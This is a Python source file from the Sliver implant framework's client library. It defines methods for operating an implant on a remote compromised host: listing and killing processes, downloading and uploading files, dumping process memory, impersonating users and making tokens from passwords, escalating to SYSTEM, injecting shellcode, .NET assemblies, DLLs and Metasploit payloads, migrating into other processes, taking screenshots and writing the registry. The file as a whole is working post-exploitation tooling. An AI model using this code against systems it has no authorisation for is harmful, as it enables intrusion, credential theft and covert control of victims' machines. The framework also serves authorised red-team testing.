"""
    Sliver Implant Framework
    Copyright (C) 2022  Bishop Fox

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

from typing import List

from .protobuf import client_pb2
from .protobuf import sliver_pb2


class BaseInteractiveCommands(object):
    async def ping(self) -> sliver_pb2.Ping:
        """Send a round trip message to the implant (does NOT use ICMP)

        :return: Protobuf ping object
        :rtype: sliver_pb2.Ping
        """
        ping = sliver_pb2.Ping()
        ping.Request = self._request()
        return await self._stub.Ping(ping, timeout=self.timeout)

    async def ps(self) -> sliver_pb2.Ps:
        """List the processes of the remote system

        :return: Ps protobuf object
        :rtype: sliver_pb2.Ps
        """
        ps = sliver_pb2.PsReq()
        return await self._stub.Ps(self._request(ps), timeout=self.timeout)

    async def terminate(self, pid: int, force=False) -> sliver_pb2.Terminate:
        """Terminate a remote process

        :param pid: The process ID to terminate.
        :type pid: int
        :param force: Force termination of the process, defaults to False
        :type force: bool, optional
        :return: Protobuf terminate object
        :rtype: sliver_pb2.Terminate
        """
        terminator = sliver_pb2.TerminateReq()
        terminator.Pid = pid
        terminator.Force = force
        return await self._stub.Terminate(
            self._request(terminator), timeout=self.timeout
        )

    async def ifconfig(self) -> sliver_pb2.Ifconfig:
        """Get network interface configuration information about the remote system

        :return: Protobuf ifconfig object
        :rtype: sliver_pb2.Ifconfig
        """
        return await self._stub.Ifconfig(
            self._request(sliver_pb2.IfconfigReq()), timeout=self.timeout
        )

    async def netstat(
        self, tcp: bool, udp: bool, ipv4: bool, ipv6: bool, listening=True
    ) -> List[sliver_pb2.SockTabEntry]:
        """Get information about network connections on the remote system.

        :param tcp: Get TCP information
        :type tcp: bool
        :param udp: Get UDP information
        :type udp: bool
        :param ipv4: Get IPv4 connection information
        :type ipv4: bool
        :param ipv6: Get IPv6 connection information
        :type ipv6: bool
        :param listening: Get listening connection information, defaults to True
        :type listening: bool, optional
        :return: Protobuf netstat object
        :rtype: List[sliver_pb2.SockTabEntry]
        """
        net = sliver_pb2.NetstatReq()
        net.TCP = tcp
        net.UDP = udp
        net.IP4 = ipv4
        net.IP6 = ipv6
        net.Listening = listening
        stat = await self._stub.Netstat(self._request(net), timeout=self.timeout)
        return list(stat.Entries)

    async def ls(self, remote_path: str = ".") -> sliver_pb2.Ls:
        """Get a directory listing from the remote system

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf ls object
        :rtype: sliver_pb2.Ls
        """
        ls = sliver_pb2.LsReq()
        ls.Path = remote_path
        return await self._stub.Ls(self._request(ls), timeout=self.timeout)

    async def cd(self, remote_path: str) -> sliver_pb2.Pwd:
        """Change the current working directory of the implant

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        """
        cd = sliver_pb2.CdReq()
        cd.Path = remote_path
        return await self._stub.Cd(self._request(cd), timeout=self.timeout)

    async def pwd(self) -> sliver_pb2.Pwd:
        """Get the implant's current working directory

        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        """
        pwd = sliver_pb2.PwdReq()
        return await self._stub.Pwd(self._request(pwd), timeout=self.timeout)

    async def rm(self, remote_path: str, recursive=False, force=False) -> sliver_pb2.Rm:
        """Remove a directory or file(s)

        :param remote_path: Remote path
        :type remote_path: str
        :param recursive: Recursively remove file(s), defaults to False
        :type recursive: bool, optional
        :param force: Forcefully remove the file(s), defaults to False
        :type force: bool, optional
        :return: Protobuf rm object
        :rtype: sliver_pb2.Rm
        """
        rm = sliver_pb2.RmReq()
        rm.Path = remote_path
        rm.Recursive = recursive
        rm.Force = force
        return await self._stub.Rm(self._request(rm), timeout=self.timeout)

    async def mkdir(self, remote_path: str) -> sliver_pb2.Mkdir:
        """Make a directory on the remote file system

        :param remote_path: Directory to create
        :type remote_path: str
        :return: Protobuf Mkdir object
        :rtype: sliver_pb2.Mkdir
        """
        make = sliver_pb2.MkdirReq()
        make.Path = remote_path
        return await self._stub.Mkdir(self._request(make), timeout=self.timeout)

    async def download(self, remote_path: str) -> sliver_pb2.Download:
        """Download a file from the remote file system

        :param remote_path: File to download
        :type remote_path: str
        :return: Protobuf Download object
        :rtype: sliver_pb2.Download
        """
        download = sliver_pb2.DownloadReq()
        download.Path = remote_path
        return await self._stub.Download(self._request(download), timeout=self.timeout)

    async def upload(
        self, remote_path: str, data: bytes, encoder=""
    ) -> sliver_pb2.Upload:
        """Write data to specified path on remote file system

        :param remote_path: Remote path
        :type remote_path: str
        :param data: Data to write
        :type data: bytes
        :param encoder: Data encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Upload object
        :rtype: sliver_pb2.Upload
        """
        upload = sliver_pb2.UploadReq()
        upload.Path = remote_path
        upload.Data = data
        upload.Encoder = encoder
        return await self._stub.Upload(self._request(upload), timeout=self.timeout)

    async def process_dump(self, pid: int) -> sliver_pb2.ProcessDump:
        """Dump a remote process' memory

        :param pid: PID of the process to dump
        :type pid: int
        :return: Protobuf ProcessDump object
        :rtype: sliver_pb2.ProcessDump
        """
        procdump = sliver_pb2.ProcessDumpReq()
        procdump.Pid = pid
        return await self._stub.ProcessDump(
            self._request(procdump), timeout=self.timeout
        )

    async def run_as(
        self, username: str, process_name: str, args: str
    ) -> sliver_pb2.RunAs:
        """Run a command as another user on the remote system

        :param username: User to run process as
        :type username: str
        :param process_name: Process to execute
        :type process_name: str
        :param args: Arguments to process
        :type args: str
        :return: Protobuf RunAs object
        :rtype: sliver_pb2.RunAs
        """
        run_as = sliver_pb2.RunAsReq()
        run_as.Username = username
        run_as.ProcessName = process_name
        run_as.Args.extend(args)
        return await self._stub.RunAs(self._request(run_as), timeout=self.timeout)

    async def impersonate(self, username: str) -> sliver_pb2.Impersonate:
        """Impersonate a user using tokens (Windows only)

        :param username: User to impersonate
        :type username: str
        :return: Protobuf Impersonate object
        :rtype: sliver_pb2.Impersonate
        """
        impersonate = sliver_pb2.ImpersonateReq()
        impersonate.Username = username
        return await self._stub.Impersonate(
            self._request(impersonate), timeout=self.timeout
        )

    async def revert_to_self(self) -> sliver_pb2.RevToSelf:
        """Revert to self from impersonation context

        :return: Protobuf RevToSelf object
        :rtype: sliver_pb2.RevToSelf
        """
        return await self._stub.RevToSelf(
            self._request(sliver_pb2.RevToSelfReq()), timeout=self.timeout
        )

    async def get_system(
        self, hosting_process: str, config: client_pb2.ImplantConfig
    ) -> sliver_pb2.GetSystem:
        """Attempt to get SYSTEM (Windows only)

        :param hosting_process: Hosting process to attempt gaining privileges
        :type hosting_process: str
        :param config: Implant configuration to be injected into the hosting process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf GetSystem object
        :rtype: sliver_pb2.GetSystem
        """
        system = client_pb2.GetSystemReq()
        system.HostingProcess = hosting_process
        system.Config = config
        return await self._stub.GetSystem(self._request(system), timeout=self.timeout)

    async def execute_shellcode(
        self, data: bytes, rwx: bool, pid: int, encoder=""
    ) -> sliver_pb2.Task:
        """Execute shellcode in-memory

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        """
        return await self.task(data, rwx, pid, encoder)

    async def task(
        self, data: bytes, rwx: bool, pid: int, encoder=""
    ) -> sliver_pb2.Task:
        """Execute shellcode in-memory ("Task" is a synonym for shellcode)

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        """
        task = sliver_pb2.TaskReq()
        task.Encoder = encoder
        task.RWXPages = rwx
        task.Pid = pid
        task.Data = data
        return await self._stub.Task(self._request(task), timeout=self.timeout)

    async def msf(
        self, payload: str, lhost: str, lport: int, encoder: str, iterations: int
    ) -> None:
        """Execute Metasploit payload on remote system, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        """
        msf = client_pb2.MSFReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        return await self._stub.Msf(self._request(msf), timeout=self.timeout)

    async def msf_remote(
        self,
        payload: str,
        lhost: str,
        lport: int,
        encoder: str,
        iterations: int,
        pid: int,
    ) -> None:
        """Execute Metasploit payload in a remote process, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        :param pid: Process ID to inject the payload into
        :type pid: int
        """
        msf = client_pb2.MSFRemoteReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        msf.PID = pid
        return await self._stub.Msf(self._request(msf), timeout=self.timeout)

    async def execute_assembly(
        self,
        assembly: bytes,
        arguments: str,
        process: str,
        is_dll: bool,
        arch: str,
        class_name: str,
        method: str,
        app_domain: str,
    ) -> sliver_pb2.ExecuteAssembly:
        """Execute a .NET assembly in-memory on the remote system

        :param assembly: A buffer of the .NET assembly to execute
        :type assembly: bytes
        :param arguments: Arguments to the .NET assembly
        :type arguments: str
        :param process: Process to execute assembly
        :type process: str
        :param is_dll: Is assembly a DLL
        :type is_dll: bool
        :param arch: Assembly architecture
        :type arch: str
        :param class_name: Class name of the assembly
        :type class_name: str
        :param method: Method to execute
        :type method: str
        :param app_domain: AppDomain
        :type app_domain: str
        :return: Protobuf ExecuteAssembly object
        :rtype: sliver_pb2.ExecuteAssembly
        """
        asm = sliver_pb2.ExecuteAssemblyReq()
        asm.Assembly = assembly
        asm.Arguments = arguments
        asm.Process = process
        asm.IsDLL = is_dll
        asm.Arch = arch
        asm.ClassName = class_name
        asm.AppDomain = app_domain
        return await self._stub.ExecuteAssembly(
            self._request(asm), timeout=self.timeout
        )

    async def migrate(
        self, pid: int, config: client_pb2.ImplantConfig
    ) -> sliver_pb2.Migrate:
        """Migrate implant to another process

        :param pid: Proccess ID to inject implant into
        :type pid: int
        :param config: Implant configuration to inject into the remote process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf Migrate object
        :rtype: sliver_pb2.Migrate
        """
        migrate = client_pb2.MigrateReq()
        migrate.Pid = pid
        migrate.Config = config
        return await self._stub.Migrate(self._request(migrate), timeout=self.timeout)

    async def execute(
        self, exe: str, args: List[str], output: bool
    ) -> sliver_pb2.Execute:
        """Execute a command/subprocess on the remote system

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        """
        exec = sliver_pb2.ExecuteReq()
        exec.Path = exe
        exec.Args.extend(args)
        exec.Output = output
        return await self._stub.Execute(self._request(exec), timeout=self.timeout)

    async def execute_token(
        self, exe: str, args: List[str], output: bool
    ) -> sliver_pb2.Execute:
        """Execute a comman/subprocess on the remote system in the context of the current user token

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        """
        execToken = sliver_pb2.ExecuteTokenReq()
        execToken.Path = exe
        execToken.Args.extend(args)
        execToken.Output = output
        return await self._stub.ExecuteToken(
            self._request(execToken), timeout=self.timeout
        )

    async def sideload(
        self,
        data: bytes,
        process_name: str,
        arguments: str,
        entry_point: str,
        kill: bool,
    ) -> sliver_pb2.Sideload:
        """Sideload a shared library into a remote process using a platform specific in-memory loader (Windows, MacOS, Linux only)

        :param data: Shared library raw bytes
        :type data: bytes
        :param process_name: Process name to sideload library into
        :type process_name: str
        :param arguments: Arguments to the shared library
        :type arguments: str
        :param entry_point: Entrypoint of the shared library
        :type entry_point: str
        :param kill: Kill normal execution of the process when side loading the shared library
        :type kill: bool
        :return: Protobuf Sideload object
        :rtype: sliver_pb2.Sideload
        """
        side = sliver_pb2.SideloadReq()
        side.Data = data
        side.ProcessName = process_name
        side.Args = arguments
        side.EntryPoint = entry_point
        side.Kill = kill
        return await self._stub.Sideload(self._request(side), timeout=self.timeout)

    async def spawn_dll(
        self,
        data: bytes,
        process_name: str,
        arguments: str,
        entry_point: str,
        kill: bool,
    ) -> sliver_pb2.SpawnDll:
        """Spawn a DLL on the remote system from memory (Windows only)

        :param data: DLL raw bytes
        :type data: bytes
        :param process_name: Process name to spawn DLL into
        :type process_name: str
        :param arguments: Arguments to the DLL
        :type arguments: str
        :param entry_point: Entrypoint of the DLL
        :type entry_point: str
        :param kill: Kill normal execution of the remote process when spawing the DLL
        :type kill: bool
        :return: Protobuf SpawnDll object
        :rtype: sliver_pb2.SpawnDll
        """
        spawn = sliver_pb2.InvokeSpawnDllReq()
        spawn.Data = data
        spawn.ProcessName = process_name
        spawn.Args = arguments
        spawn.EntryPoint = entry_point
        spawn.Kill = kill
        return await self._stub.SpawnDll(self._request(spawn), timeout=self.timeout)

    async def screenshot(self) -> sliver_pb2.Screenshot:
        """Take a screenshot of the remote system, screenshot data is PNG formatted

        :return: Protobuf Screenshot object
        :rtype: sliver_pb2.Screenshot
        """
        return await self._stub.Screenshot(
            self._request(sliver_pb2.ScreenshotReq()), timeout=self.timeout
        )

    async def make_token(
        self, username: str, password: str, domain: str
    ) -> sliver_pb2.MakeToken:
        """Make a Windows user token from a valid login (Windows only)

        :param username: Username
        :type username: str
        :param password: Password
        :type password: str
        :param domain: Domain
        :type domain: str
        :return: Protobuf MakeToken object
        :rtype: sliver_pb2.MakeToken
        """
        make = sliver_pb2.MakeTokenReq()
        make.Username = username
        make.Password = password
        make.Domain = domain
        return await self._stub.MakeToken(self._request(make), timeout=self.timeout)

    async def get_env(self, name: str) -> sliver_pb2.EnvInfo:
        """Get an environment variable

        :param name: Name of the variable
        :type name: str
        :return: Protobuf EnvInfo object
        :rtype: sliver_pb2.EnvInfo
        """
        env = sliver_pb2.EnvReq()
        env.Name = name
        return await self._stub.GetEnv(self._request(env), timeout=self.timeout)

    async def set_env(self, name: str, value: str) -> sliver_pb2.SetEnv:
        """Set an environment variable

        :param name: Name of the environment variable
        :type name: str
        :param value: Value of the environment variable
        :type value: str
        :return: Protobuf SetEnv object
        :rtype: sliver_pb2.SetEnv
        """
        env = sliver_pb2.SetEnvReq()
        env.EnvVar.Key = name
        env.EnvVar.Value = value
        return await self._stub.SetEnv(self._request(env), timeout=self.timeout)

    async def registry_read(
        self, hive: str, reg_path: str, key: str, hostname: str
    ) -> sliver_pb2.RegistryRead:
        """Read a value from the remote system's registry (Windows only)

        :param hive: Registry hive to read value from
        :type hive: str
        :param reg_path: Path to registry key to read
        :type reg_path: str
        :param key: Key name to read
        :type key: str
        :param hostname: Hostname
        :type hostname: str
        :return: Protobuf RegistryRead object
        :rtype: sliver_pb2.RegistryRead
        """
        reg = sliver_pb2.RegistryReadReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return await self._stub.RegistryRead(self._request(reg), timeout=self.timeout)

    async def registry_write(
        self,
        hive: str,
        reg_path: str,
        key: str,
        hostname: str,
        string_value: str,
        byte_value: bytes,
        dword_value: int,
        qword_value: int,
    ) -> sliver_pb2.RegistryWrite:
        """Write a value to the remote system's registry (Windows only)

        :param hive: Registry hive to write the key/value to
        :type hive: str
        :param reg_path: Registry path to write to
        :type reg_path: str
        :param key: Registry key to write to
        :type key: str
        :param hostname: Hostname
        :type hostname: str
        :param string_value: String value to write (ignored for non-string key)
        :type string_value: str
        :param byte_value: Byte value to write (ignored for non-byte key)
        :type byte_value: bytes
        :param dword_value: DWORD value to write (ignored for non-DWORD key)
        :type dword_value: int
        :param qword_value: QWORD value to write (ignored for non-QWORD key)
        :type qword_value: int
        :param reg_type: Type of registry key to write
        :type reg_type: sliver_pb2.RegistryType
        :return: Protobuf RegistryWrite object
        :rtype: sliver_pb2.RegistryWrite
        """
        reg = sliver_pb2.RegistryWriteReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        reg.StringValue = string_value
        reg.ByteValue = byte_value
        reg.DWordValue = dword_value
        reg.QWordValue = qword_value

        return await self._stub.RegistryWrite(self._request(reg), timeout=self.timeout)

    async def registry_create_key(
        self, hive: str, reg_path: str, key: str, hostname: str
    ) -> sliver_pb2.RegistryCreateKey:
        """Create a registry key on the remote system (Windows only)

        :param hive: Registry hive to create key in
        :type hive: str
        :param reg_path: Registry path to create key in
        :type reg_path: str
        :param key: Key name
        :type key: str
        :param hostname: Hostname
        :type hostname: str
        :return: Protobuf RegistryCreateKey object
        :rtype: sliver_pb2.RegistryCreateKey
        """
        reg = sliver_pb2.RegistryCreateKeyReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return await self._stub.RegistryCreateKey(
            self._request(reg), timeout=self.timeout
        )
